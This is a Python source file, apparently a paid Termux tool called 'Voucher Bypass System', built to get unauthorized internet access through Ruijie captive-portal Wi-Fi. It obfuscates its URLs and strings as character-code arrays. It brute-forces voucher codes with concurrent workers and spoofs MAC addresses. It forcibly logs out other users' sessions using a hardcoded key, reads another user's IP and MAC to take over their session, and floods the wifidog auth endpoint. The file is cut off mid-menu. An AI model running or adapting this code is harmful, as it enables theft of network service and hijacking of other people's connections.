# -*- coding: utf-8 -*-
import os
import re
import sys
import zlib
import json
import time
import socket
import ping3
import ntplib
import base64
import random
import string
import urllib
import marshal
import aiohttp
import asyncio
import hashlib
import uuid
import argparse
import requests
import subprocess
import threading
import itertools
import math
from datetime import timedelta, datetime
from urllib.parse import quote, unquote
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor
import urllib3
import sqlite3   # <-- added for license DB

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_w_ = "\033[1;00m"
_g_ = "\033[1;32m"
_y_ = "\033[1;33m"
_r_ = "\033[1;31m"
_b_ = "\033[1;34m"
_c_ = "\033[1;36m"
_p_ = "\033[1;35m"

_G_S_C_ = 0

# ==================== LICENSE SYSTEM ====================
def get_device_id():
    """Generate a unique device ID (persistent)"""
    try:
        # Try to get Android fingerprint + MAC
        aid = subprocess.check_output(["getprop", "ro.build.fingerprint"], text=True).strip()
        mac = subprocess.check_output(["cat", "/sys/class/net/wlan0/address"], text=True).strip()
        unique = hashlib.md5(f"{aid}{mac}".encode()).hexdigest()[:12].upper()
        return f"DEV-{unique}"
    except:
        id_file = ".device_id"
        if os.path.exists(id_file):
            return open(id_file).read().strip()
        new_id = "DEV-" + hashlib.md5(os.urandom(16)).hexdigest()[:12].upper()
        open(id_file, "w").write(new_id)
        return new_id

def check_license_via_bot(device_id):
    """Check remaining credit from credits.db (created by bot)"""
    db_path = "credits.db"
    if not os.path.exists(db_path):
        # If no DB, allow for testing (but show warning)
        print(f"{_y_}[!] Warning: credits.db not found. Running in test mode (no license limit).{_w_}")
        return True, 999
    try:
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        c.execute("SELECT credit_hours, expiry_date FROM devices WHERE device_id=?", (device_id,))
        row = c.fetchone()
        conn.close()
        if not row:
            return False, 0
        hours, expiry_str = row
        expiry = datetime.fromisoformat(expiry_str)
        if datetime.now() > expiry:
            return False, 0
        remaining = (expiry - datetime.now()).total_seconds() / 3600
        return True, remaining
    except Exception as e:
        print(f"{_r_}[!] License check error: {e}{_w_}")
        return False, 0
# ========================================================

def _d(arr):
    return "".join([chr(i) for i in arr])

def _o_u1():
    return _d([104, 116, 116, 112, 115, 58, 47, 47]) + _d([112, 97, 115, 115, 98, 111, 116, 45]) + _d([101, 48, 56, 116, 46, 111, 110]) + _d([114, 101, 110, 100, 101, 114, 46, 99, 111, 109])

def _o_u2():
    return _d([104, 116, 116, 112, 58, 47, 47]) + _d([49, 48, 46, 52, 52, 46]) + _d([55, 55, 46, 50, 52, 48]) + _d([58, 50, 48, 54, 48])

def _o_u3():
    return _d([104, 116, 116, 112, 58, 47, 47]) + _d([49, 57, 50, 46]) + _d([49, 54, 56, 46]) + _d([48, 46, 49])

def _o_u4():
    return _d([104, 116, 116, 112, 115, 58, 47, 47]) + _d([112, 111, 114, 116, 97, 108, 45, 97, 115]) + _d([46, 114, 117, 105, 106, 105, 101, 110, 101, 116]) + _d([119, 111, 114, 107, 115, 46, 99, 111, 109])

def _o_u5():
    return _d([104, 116, 116, 112, 115, 58, 47, 47]) + _d([104, 116, 116, 112]) + _d([98, 105, 110, 46, 111, 114, 103]) + _d([47, 103, 101, 116])

def _o_u6():
    return _d([104, 116, 116, 112, 115, 58, 47, 47]) + _d([112, 111, 114, 116, 97, 108, 45, 97, 115, 46, 114, 117, 105, 106, 105, 101, 110, 101, 116, 119, 111, 114, 107, 115, 46, 99, 111, 109]) + _d([47, 97, 112, 105, 47, 97, 117, 116, 104, 47, 118, 111, 117, 99, 104, 101, 114, 47]) + _d([63, 108, 97, 110, 103, 61, 101, 110, 95, 85, 83])

def _o_p():
    return _d([112, 111, 114, 116, 97, 108, 45, 97, 115]) + _d([46, 114, 117, 105, 106, 105, 101]) + _d([110, 101, 116, 119, 111, 114]) + _d([107, 115, 46, 99, 111, 109])

def _clr():
    os.system(_d([99, 108, 101, 97, 114]) if os.name == _d([112, 111, 115, 105, 120]) else _d([99, 108, 115]))

def _ln():
    try:
        print(f"{_y_}-" * os.get_terminal_size()[0])
    except OSError:
        print(f"{_y_}-" * 50)

def _lg():
    _clr()
    try:
        term_w = os.get_terminal_size()[0]
    except OSError:
        term_w = 80

    logo_lines = [
        "  _____  _    _ _____       _ _____ ______ ",
        " |  __ \\| |  | |_   _|     | |_   _|  ____|",
        " | |__) | |  | | | |       | | | | | |__   ",
        " |  _  /| |  | | | |   _   | | | | |  __|",
        " | | \\ \\| |__| |_| |_ | |__| |_| |_| |____ ",
        " |_|  \\_\\\\____/|_____| \\____/|_____|______|"
    ]

    print(f"\n{_g_}", end="")
    for line in logo_lines:
        padding = (term_w - len(line)) // 2
        print(" " * padding + line)

    ver_txt = "[ Open Source Version ]"
    ver_padding = (term_w - len(ver_txt)) // 2
    print("\n" + " " * ver_padding + f"{_y_}{ver_txt}{_g_}")

    welcome_txt = "Welcome to Voucher Bypass System!"
    welcome_padding = (term_w - len(welcome_txt)) // 2
    print("\n" + " " * welcome_padding + welcome_txt + f"{_w_}")
    _ln()

def _chk_strg():
    if os.path.exists("/data/data/com.termux/files/usr"):
        storage_path = os.path.expanduser("~/storage")
        while not os.path.exists(storage_path):
            _clr()
            print(f"{_r_}[ ✘ ] Storage permission not configured!{_w_}")
            u_choice = input(f"{_c_}[?] Setup storage permission? (y/n): {_w_}").strip().lower()
            if u_choice == 'y':
                try:
                    subprocess.run(["termux-setup-storage"])
                    print(f"\n{_y_}[*] Please allow the permission popup on your screen...{_w_}")
                    time.sleep(4)
                    if os.path.exists(storage_path):
                        print(f"{_g_}[ ✔ ] Storage permission linked successfully!{_w_}\n")
                        time.sleep(1)
                        break
                except Exception:
                    print(f"{_r_}[ ✘ ] Failed to execute termux-setup-storage.{_w_}")
                    sys.exit()
            elif u_choice == 'n':
                print(f"{_r_}[ ✘ ] Script terminated: Storage permission is mandatory.{_w_}")
                sys.exit()

def _g_r_m():
    m = [random.randint(0x00, 0xff) for _ in range(6)]
    m[0] = (m[0] | 0x02) & 0xfe 
    return ':'.join(f'{x:02x}' for x in m)

async def _g_s_i(session, s_u, p_s_i):
    if not s_u: return p_s_i
    n_m = _g_r_m()
    if _d([109, 97, 99, 61]) in s_u:
        s_u_s = re.sub(r'mac=[^&]+', f'mac={n_m}', s_u)
    else:
        s_u_s = s_u

    h = {
        'authority': _o_p(),
        'accept': _d([116, 101, 120, 116, 47, 104, 116, 109, 108, 44, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 120, 104, 116, 109, 108, 43, 120, 109, 108, 44, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 120, 109, 108, 59, 113, 61, 48, 46, 57, 44, 42, 47, 42, 59, 113, 61, 48, 46, 56]),
        'referer': s_u_s,
        'user-agent': _d([77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 76, 105, 110, 117, 120, 59, 32, 65, 110, 100, 114, 111, 105, 100, 32, 49, 48, 59, 32, 75, 41, 32, 65, 112, 112, 108, 105, 101, 87, 101, 98, 75, 105, 116, 47, 53, 51, 55, 46, 51, 54, 32, 40, 75, 72, 84, 77, 76, 44, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, 41, 32, 67, 104, 114, 111, 109, 101, 47, 49, 51, 57, 46, 48, 46, 48, 46, 48, 32, 77, 111, 98, 105, 108, 101, 32, 83, 97, 102, 97, 114, 105, 47, 53, 51, 55, 46, 51, 54]),
    }
    try:
        async with session.get(s_u_s, headers=h, timeout=5) as req:
            res = str(req.url)
            s_i = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", res).group(1)
            return s_i
    except Exception:
        return p_s_i

class _S_:
    def __init__(self):
        self.baseurl = _o_u2()
        self.username_get_url = self.baseurl + _d([47, 117, 115, 101, 114, 110, 97, 109, 101, 95, 103, 101, 116])
        self.online_info_url = self.baseurl + _d([47, 115, 101, 114, 47, 111, 110, 108, 105, 110, 101, 95, 105, 110, 102, 111])
        self.logout_url = self.baseurl + _d([47, 115, 101, 114, 47, 108, 111, 103, 111, 117, 116])
    
    def set(self):
        print(f"\n{_y_}[*] Initializing Setup Process...{_w_}")
        time.sleep(0.5)
        
        print(f"{_c_}[*] Checking current session & unbinding...{_w_}")
        unbind_status = self.unbind()
        if unbind_status:
            print(f"{_g_}[ ✔ ] Unbind successful.{_w_}")
            
        print(f"{_c_}[*] Fetching network configuration...{_w_}")
        try:
            localhost = requests.get(_o_u3(), timeout=10).url
            ip = re.search(_d([103, 119, 95, 97, 100, 100, 114, 101, 115, 115, 61, 40, 46, 42, 63, 41, 38]), localhost).group(1)
            print(f"{_g_}[ ✔ ] Gateway IP found: {ip}{_w_}")
            
            headers = {
                'authority': _o_p(),
                'accept': '*/*',
                'user-agent': _d([77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 76, 105, 110, 117, 120, 59, 32, 65, 110, 100, 114, 111, 105, 100, 32, 49, 48, 59, 32, 75, 41]),
            }
            print(f"{_c_}[*] Extracting Session parameters...{_w_}")
            req = requests.get(localhost, headers=headers).text
            session_url = _o_u4() + re.search(_d([104, 114, 101, 102, 61, 39, 40, 46, 42, 63, 41, 39, 60, 47, 115, 99, 114, 105, 112, 116, 62]), req).group(1)
            
            open(_d([46, 115, 101, 115, 115, 105, 111, 110, 95, 117, 114, 108]), "w").write(session_url)
            open(_d([46, 105, 112]), "w").write(ip)
            
            print(f"{_g_}[ ✔ ] Setup Completed Successfully!{_w_}")
        except Exception:
            print(f"{_r_}[ ✘ ] Setup Failed: Please ensure you are connected to the portal network.{_w_}")

    def unbind(self):
        username = self.username_get()
        if not username:
            return False
        online_info = self.get_online_info(username)
        if not online_info:
            return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try:
            req = requests.get(self.username_get_url).json()
        except:
            return None
        return req.get(_d([117, 115, 101, 114, 110, 97, 109, 101]), None)
    
    def get_online_info(self, username):
        params = {_d([117, 115, 101, 114, 110, 97, 109, 101]):username, _d([117, 115, 101, 114, 116, 121, 112, 101]):_d([119, 105, 102, 105, 100, 111, 103])}
        try:
            req = requests.get(self.online_info_url, params=params).json()
        except:
            return None
        try:
            return req[_d([100, 97, 116, 97])][_d([108, 105, 115, 116])][0]
        except IndexError:
            return None

    def arrange_data(self, info):
        repmac = info[_d([109, 97, 99])].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        mac_req = ".".join(repmac)
        return {
            _d([105, 112]):info[_d([105, 112])],
            _d([109, 97, 99]):info[_d([109, 97, 99])],
            _d([105, 112, 95, 114, 101, 113]):info[_d([105, 112])],
            _d([109, 97, 99, 95, 114, 101, 113]):mac_req
        }

    def get_data(self):
        try:
            return requests.get(self.baseurl).text
        except:
            return None

    def extract_chap(self, data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)", data)
        if not match: return None
        return {_d([99, 104, 97, 112, 95, 105, 100]):match.group(1), _d([99, 104, 97, 112, 95, 99, 104, 97, 108, 108, 101, 110, 103, 101]):match.group(2)}
    
    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode(_d([117, 116, 102, 45, 56])) + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(auth.encode(_d([117, 116, 102, 45, 56])), AES.block_size)
        cipher_text = cipher.encrypt(padded_data)
        encrypted_data = b"Salted__" + salt + cipher_text
        return base64.b64encode(encrypted_data).decode(_d([117, 116, 102, 45, 56]))

    def get_auth(self, username):
        enc_key = _d([82, 106, 89, 107, 104, 119, 122, 120, 36, 50, 48, 49, 56, 33])
        data = self.get_data()
        if not data: return None
        chaps = self.extract_chap(data)
        if not chaps: return None
        chap_id_decoded = urllib.parse.unquote(chaps[_d([99, 104, 97, 112, 95, 105, 100])])
        chap_challenge_decoded = urllib.parse.unquote(chaps[_d([99, 104, 97, 112, 95, 99, 104, 97, 108, 108, 101, 110, 103, 101])])
        auth = chap_id_decoded + chap_challenge_decoded + username
        auth_encrypt = self.encrypt_cryptojs(auth, enc_key)
        return auth_encrypt

    def logout(self, data, username):
        auth = self.get_auth(username)
        if not auth: return False
        payload = f"ip={data[_d([105, 112])]}&mac={data[_d([109, 97, 99])]}&ip_req={data[_d([105, 112, 95, 114, 101, 113])]}&mac_req={data[_d([109, 97, 99, 95, 114, 101, 113])]}&auth={auth}"
        try:
            respond = requests.post(self.logout_url, data=payload).json()
            if respond[_d([115, 117, 99, 99, 101, 115, 115])]: return True
        except Exception:
            return False

async def _l_v(session, session_id, voucher, tracker=None, is_recheck=False):
    global _G_S_C_
    data = {_d([97, 99, 99, 101, 115, 115, 67, 111, 100, 101]): voucher, _d([115, 101, 115, 115, 105, 111, 110, 73, 100]): session_id, _d([97, 112, 105, 86, 101, 114, 115, 105, 111, 111, 110]): 1}
    post_url = _o_u6()
    
    headers = {
        "authority": _o_p(),
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": _d([97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 106, 115, 111, 110]),
        "origin": _o_u4(),
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        async with session.post(post_url, headers=headers, json=data, timeout=5) as req:
            response_text = await req.text()
            
            if tracker is not None: 
                tracker['attempts'] += 1
                
            if _d([108, 111, 103, 111, 110, 85, 114, 108]) in response_text:
                if not is_recheck:
                    print(f"\n{_g_}[ ✔ ] SUCCESS: {voucher}{_w_}")
                    with open(_d([115, 117, 99, 99, 101, 115, 115, 46, 116, 120, 116]), "a") as f: f.write(f"{voucher}\n")
                    _G_S_C_ += 1
                return _d([83, 85, 67, 67, 69, 83, 83])
            elif _d([83, 84, 65]) in response_text:
                if not is_recheck:
                    print(f"\n{_p_}[ ⚠ ] LIMITED (STA): {voucher}{_w_}")
                    with open(_d([115, 117, 99, 99, 101, 115, 115, 46, 116, 120, 116]), "a") as f: f.write(f"{voucher}\n")
                    _G_S_C_ += 1
                return "LIMITED"
            elif _d([102, 97, 105, 108, 101, 100]) in response_text or _d([101, 120, 112, 105, 114, 101, 100]) in response_text:
                return _d([70, 65, 73, 76, 69, 68])
            else:
                return _d([70, 65, 73, 76, 69, 68])
    except Exception: 
        return _d([69, 82, 82, 79, 82])

class _V_C_:
    def __init__(self, mode, code_length):
        try: self.session_url = open(_d([46, 115, 101, 115, 115, 105, 111, 110, 95, 117, 114, 108]), "r").read().strip()
        except: 
            print(f"{_r_}[!] Please run Setup [1] first.{_w_}")
            time.sleep(2)
            self.session_url = None
        
        self.mode = mode
        self.code_length = code_length

        if self.mode == "digit":
            self.file = "failed.txt" if self.code_length == 6 else "failed7.txt"
        elif self.mode == "ascii-lower":
            self.file = "ascii_lower_bin6.txt" if self.code_length == 6 else "ascii_lower_bin7.txt"
        elif self.mode == "ascii-upper":
            self.file = "ascii_upper_bin6.txt" if self.code_length == 6 else "ascii_upper_bin7.txt"
        elif self.mode == "ascii-mix":
            self.file = "ascii_bin_mix6.txt" if self.code_length == 6 else "ascii_bin_mix7.txt"
        elif self.mode == "alphanumeric":
            self.file = "alphanumeric_bin6.txt" if self.code_length == 6 else "alphanumeric_bin7.txt"
        else:
            self.file = "failed.txt"
        
    async def execute(self):
        if not getattr(self, 'session_url', None):
            return

        global _G_S_C_
        _G_S_C_ = 0
        
        _lg()
                
        checked_codes = set()
        try:
            with open(self.file, "r") as f:
                for line in f:
                    checked_codes.add(line.strip())
        except MemoryError:
            print(f"{_y_}[!] Warning: Phone memory is low. Loading fewer cache...{_w_}")
            time.sleep(1)
        except FileNotFoundError:
            pass

        try:
            with open("success.txt", "r") as f:
                for line in f:
                    checked_codes.add(line.strip())
        except Exception:
            pass

        def voucher_generator(mode, length, checked_set):
            if mode == "digit":
                chars = string.digits
            elif mode == "ascii-lower":
                chars = string.ascii_lowercase
            elif mode == "ascii-upper":
                chars = string.ascii_uppercase
            elif mode == "ascii-mix":
                chars = string.ascii_letters
            elif mode == "alphanumeric":
                chars = string.ascii_lowercase + string.digits
            else:
                chars = string.digits

            base = len(chars)
            n = base ** length
            
            s = n // 2 + 13579
            while math.gcd(s, n) != 1:
                s += 1
                
            start_offset = random.randint(0, n - 1)

            for i in range(n):
                idx = (start_offset + i * s) % n
                
                temp_idx = idx
                res = []
                for _ in range(length):
                    res.append(chars[temp_idx % base])
                    temp_idx //= base
                v = "".join(reversed(res))
                
                if v not in checked_set:
                    yield v

        vouchers_iter = voucher_generator(self.mode, self.code_length, checked_codes)

        print(f"{_g_}[+] Voucher Code searching...{_w_}")
        
        connector = aiohttp.TCPConnector(limit=100) 
        
        tracker = {'attempts': 0, 'workers': 10, 'stop': False} 
        start_time = time.time()
        
        async def worker(session):
            session_id = None
            loop = 0
            while not tracker['stop']:
                if loop % 50 == 0: 
                    session_id = await _g_s_i(session, self.session_url, session_id)
                
                try:
                    voucher = next(vouchers_iter)
                except StopIteration:
                    tracker['stop'] = True
                    break
                
                t1 = time.time()
                status = await _l_v(session, session_id, voucher, tracker)
                t2 = time.time()
                
                if status == _d([70, 65, 73, 76, 69, 68]):
                    with open(self.file, "a") as f: f.write(f"{voucher}\n")

                delay = t2 - t1
                if status == _d([69, 82, 82, 79, 82]) or delay > 2.5:
                    tracker['workers'] = max(5, tracker['workers'] - 2)
                    await asyncio.sleep(0.5 + delay/2)
                elif delay < 1.0:
                    tracker['workers'] = min(100, tracker['workers'] + 1)

                loop += 1
                await asyncio.sleep(0)

        async def worker_manager(session):
            active_tasks = set()
            while not tracker['stop']:
                active_tasks = {t for t in active_tasks if not t.done()}
                
                if len(active_tasks) < tracker['workers']:
                    for _ in range(tracker['workers'] - len(active_tasks)):
                        active_tasks.add(asyncio.create_task(worker(session)))
                
                await asyncio.sleep(0.5)
            for t in active_tasks:
                t.cancel()

        async def ui_updater():
            while not tracker['stop']:
                elapsed = time.time() - start_time
                speed = tracker['attempts'] / elapsed if elapsed > 0 else 0
                print(f"\r{_c_}[ ⚡ ] Speed: {speed:.0f}/s | Checked: {tracker['attempts']} | Found: {_G_S_C_} | W: {tracker['workers']}{_w_}    ", end="", flush=True)
                await asyncio.sleep(0.5) 

        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                manager_task = asyncio.create_task(worker_manager(session))
                ui_task = asyncio.create_task(ui_updater())
                await asyncio.gather(manager_task, ui_task)
        except KeyboardInterrupt:
            tracker['stop'] = True
            pass
        except Exception as e:
            tracker['stop'] = True
            print(f"\n{_r_}[!] Async Error: {str(e)}{_w_}")
            time.sleep(2)

class _R_V_:
    def __init__(self):
        pass

    async def check(self):
        _lg()
        try: 
            raw_codes = open(_d([115, 117, 99, 99, 101, 115, 115, 46, 116, 120, 116]), "r").read().splitlines()
            codes = list(dict.fromkeys([c.strip() for c in raw_codes if c.strip()]))
        except: 
            print(f"{_r_}[!] No saved codes found in success.txt{_w_}")
            time.sleep(2)
            return
            
        try: s_url = open(_d([46, 115, 101, 115, 115, 105, 111, 110, 95, 117, 114, 108]), "r").read().strip()
        except: 
            print(f"{_r_}[!] Please run Setup [1] first.{_w_}")
            time.sleep(2)
            return
        
        if not codes:
            print(f"{_r_}[!] No valid codes to check.{_w_}")
            time.sleep(2)
            return
            
        print(f"{_y_}[*] Rechecking {len(codes)} codes...{_w_}")
        _ln()
        
        valid_codes = []
        try:
            connector = aiohttp.TCPConnector(limit=50)
            async with aiohttp.ClientSession(connector=connector) as session:
                for i in range(0, len(codes), 2):
                    v1 = codes[i]
                    v2 = codes[i+1] if i+1 < len(codes) else None
                    
                    session_id = await _g_s_i(session, s_url, None)
                    if session_id:
                        status1 = await _l_v(session, session_id, v1, is_recheck=True)
                        if status1 == _d([83, 85, 67, 67, 69, 83, 83]):
                            print(f"{_g_}[ ✔ ] SUCCESS: {v1}{_w_}")
                            valid_codes.append(v1)
                        elif status1 == "LIMITED":
                            print(f"{_p_}[ ⚠ ] LIMITED (STA): {v1}{_w_}")
                            valid_codes.append(v1)
                        
                        if v2:
                            status2 = await _l_v(session, session_id, v2, is_recheck=True)
                            if status2 == _d([83, 85, 67, 67, 69, 83, 83]):
                                print(f"{_g_}[ ✔ ] SUCCESS: {v2}{_w_}")
                                valid_codes.append(v2)
                            elif status2 == "LIMITED":
                                print(f"{_p_}[ ⚠ ] LIMITED (STA): {v2}{_w_}")
                                valid_codes.append(v2)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            pass
        
        with open(_d([115, 117, 99, 99, 101, 115, 115, 46, 116, 120, 116]), "w") as f:
            for vc in valid_codes:
                f.write(f"{vc}\n")
                
        _ln()
        print(f"{_g_}[ ✔ ] Recheck finished. Valid codes: {len(valid_codes)}{_w_}")
        input(f"\n{_c_}Press Enter...{_w_}")

class UrlBypass:
    def __init__(self, portal_url):
        self.portal_url = portal_url
        try:
            self.ip = open(".ip", "r").read().strip()
        except FileNotFoundError:
            print(f"{_r_}[!] Ip not found. Please run Setup [1] first.{_w_}")
            self.ip = None

    def get_random_code(self):
        return "".join(random.choice(string.digits) for _ in range(6))

    async def get_session_id(self, session, previous_session_id):
        headers = {
            'authority': 'portal-as.ruijienetworks.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'referer': self.portal_url,
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        try:
            async with session.get(self.portal_url, headers=headers) as req:
                response = str(req.url)
                session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
                return session_id
        except Exception as e:
            return previous_session_id

    async def is_internet_access(self, session):
        try:
            async with session.get("https://httpbin.org/") as req:
             return f"{_g_}True{_w_}"
        except:
            return f"{_r_}False{_w_}"
    
    def get_ping(self, ping_val):
        if ping_val is None:
            return f'{_r_}Unknown{_w_}'
        else:
            ping_val = int(ping_val * 1000)
            if ping_val >= 100:
                return f'{_r_}{ping_val}{_w_}'
            elif ping_val >= 90 and ping_val < 100:
                return f'{_y_}{ping_val}{_w_}'
            if ping_val < 90:
                return f'{_g_}{ping_val}{_w_}'

    async def send_request(self, session, session_id, log=True):
        random_code = self.get_random_code()
        headers = {
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)',
        }
        params = {
            'token': session_id,
            'phoneNumber': random_code,
        }
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params, headers=headers) as response:
                if log:
                    status_code = f"{_g_}{response.status}"
                    now = f"{_b_}{time.strftime('%H-%M-%S')}"
                    ping_status = await asyncio.to_thread(ping3.ping, 'google.com')
                    ping_str = self.get_ping(ping_status)
                    is_open = await self.is_internet_access(session)
                    print(f"{_w_}time: {now}, {_w_}status: {status_code}, {_w_}ping: {ping_str}, {_w_}internet-open: {is_open}")
        except:
            return

    async def execute(self):
        if not self.ip:
            time.sleep(2)
            return
        _lg()
        print(f"{_g_}[+] Starting Internet Bypass...{_w_}")
        print(f"{_g_}[+] If there are no logs for a long time, turn your Wi-Fi off and on{_w_}")
        _ln()
        connector = aiohttp.TCPConnector(limit=10)
        timeout = aiohttp.ClientTimeout(total=10)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                loop = 0
                tasks = []
                continue_running = True
                session_id = None
                while continue_running:
                    if loop % 5 == 0:
                        session_id = await self.get_session_id(session, session_id)
                    tasks.append(self.send_request(session, session_id, log=True))
                    if len(tasks) >= 5:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    await asyncio.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{_y_}[*] User cancel called{_w_}")
            time.sleep(1)

def fetch_portal_url():
    gateways = ["192.168.110.1", "192.168.0.1", "10.44.77.254"]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        gateways.insert(0, '.'.join(parts))
    except:
        pass
    
    gateways = list(dict.fromkeys(gateways))
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36', 'Accept': '*/*'}
    
    for gw in gateways:
        target = f"http://{gw}"
        try:
            res = requests.get(target, headers=headers, timeout=5, allow_redirects=True)
            if "portal-as.ruijienetworks.com" in res.url:
                return res.url
            match = re.search(r"href=['\"](.*?)['\"]", res.text)
            if match and "portal-as.ruijienetworks.com" in match.group(1):
                extracted = match.group(1)
                return extracted if extracted.startswith("http") else "https://portal-as.ruijienetworks.com" + extracted
        except:
            pass
    
    try:
        res = requests.get("http://httpbin.org/get", headers=headers, timeout=5)
        if "portal-as.ruijienetworks.com" in res.url: return res.url
        match = re.search(r"href=['\"](.*?)['\"]", res.text)
        if match and "portal-as.ruijienetworks.com" in match.group(1): return match.group(1)
    except:
        pass
    
    try:
        return open(".session_url", "r").read().strip()
    except:
        return None

def get_target_info(limited_code):
    params = {"username": limited_code, "usertype": "wifidog"}
    try:
        req = requests.get("http://10.44.77.240:2060/user/online_info", params=params, timeout=5).json()
        if 'data' in req and 'list' in req['data'] and len(req['data']['list']) > 0:
            info = req['data']['list'][0]
            return info.get('ip'), info.get('mac')
    except:
        pass
    return None, None

def transform_portal_url(portal_url, target_ip, target_mac):
    api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
    api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
    if target_ip:
        api_url = re.sub(r'ip=[^&]*', f'ip={target_ip}', api_url)
    if target_mac:
        api_url = re.sub(r'mac=[^&]*', f'mac={target_mac}', api_url)
    return api_url

def main():
    _chk_strg()
    
    # ========== LICENSE CHECK (ADDED) ==========
    device_id = get_device_id()
    _lg()
    print(f"{_c_}Your Device ID: {device_id}{_w_}")
    print(f"{_y_}Send this ID to Telegram Bot -> /approve {device_id} 5{_w_}")
    
    valid, remaining = check_license_via_bot(device_id)
    if not valid:
        print(f"{_r_}[!] No valid license or credit expired.{_w_}")
        print(f"{_y_}Please ask admin to approve your device via Telegram Bot.{_w_}")
        input("\nPress Enter to exit...")
        return
    print(f"{_g_}[✔] License valid. Remaining: {remaining:.1f} hours{_w_}")
    time.sleep(1.5)
    # ==========================================
    
    while True:
        try:
            _lg()
            print(f"{_w_}[1] {_g_}Setup{_w_}")
            print(f"{_w_}[2] {_g_}Voucher Code{_w_}")
            print(f"{_w_}[3] {_g_}Success Code{_w_}")
            print(f"{_w_}[4] {_g_}Limited Code Bypass{_w_}")
            print(f"{_w_}[0] {_r_}Exit{_w_}")
            _ln()
            choice = input(f"{_c_}Select Option: {_w_}")
            
            if choice == '1':
                _S_().set()
                input(f"\n{_c_}Press Enter to return to menu...{_w_}")
                
            elif choice == '2':
                _lg()
                print(f"{_g_}[+] Select Character Set for Voucher Code:{_w_}")
                print(f"{_w_}[1] Number only {_y_}(e.g., 0-9){_w_}")
                print(f"{_w_}[2] Lower letter only {_y_}(e.g., a-z){_w_}")
                print(f"{_w_}[3] Upper letter only {_y_}(e.g., A-Z){_w_}")
                print(f"{_w_}[4] Mix lower-upper letter {_y_}(e.g., a-z, A-Z){_w_}")
                print(f"{_w_}[5] Alphanumeric {_y_}(Lower letter & number){_w_}")
                print(f"{_w_}[0] Back to Main Menu{_w_}")
                _ln()
                sub_choice = input(f"{_c_}Select Option: {_w_}")
                
                if sub_choice == '0':
                    continue
                    
                mode = ""
                if sub_choice == '1': mode = "digit"
                elif sub_choice == '2': mode = "ascii-lower"
                elif sub_choice == '3': mode = "ascii-upper"
                elif sub_choice == '4': mode = "ascii-mix"
                elif sub_choice == '5': mode = "alphanumeric"
                else:
                    print(f"{_r_}[!] Invalid choice!{_w_}")
                    time.sleep(1)
                    continue
                
                _ln()
                length_input = input(f"{_c_}Enter Code Length (e.g., 6 or 7): {_w_}")
                try:
                    code_length = int(length_input)
                    if code_length <= 0: raise ValueError()
                except:
                    print(f"{_r_}[!] Invalid length! Please enter a valid number.{_w_}")
                    time.sleep(1.5)
                    continue
                
                try:
                    v_obj = _V_C_(mode, code_length)
                    if getattr(v_obj, _d([115, 101, 115, 115, 105, 111, 110, 95, 117, 114, 108]), None) is not None:
                        asyncio.run(v_obj.execute())
                except KeyboardInterrupt:
                    continue
                except Exception as ex:
                    print(f"\n{_r_}[!] Error in Voucher Code: {str(ex)}{_w_}")
                    time.sleep(2)
                    continue
                    
            elif choice == '3':
                try:
                    asyncio.run(_R_V_().check())
                except (Exception, KeyboardInterrupt, asyncio.CancelledError):
                    pass
                    
            elif choice == '4':
                saved_code_file = ".saved_limited_code"
                saved_api_file = ".saved_api_url"
                
                saved_code = ""
                if os.path.exists(saved_code_file):
                    saved_code = open(saved_code_file, "r").read().strip()
                
                _lg()
                if saved_code:
                    print(f"{_y_}Saved Limited Code: {_w_}{saved_code}")
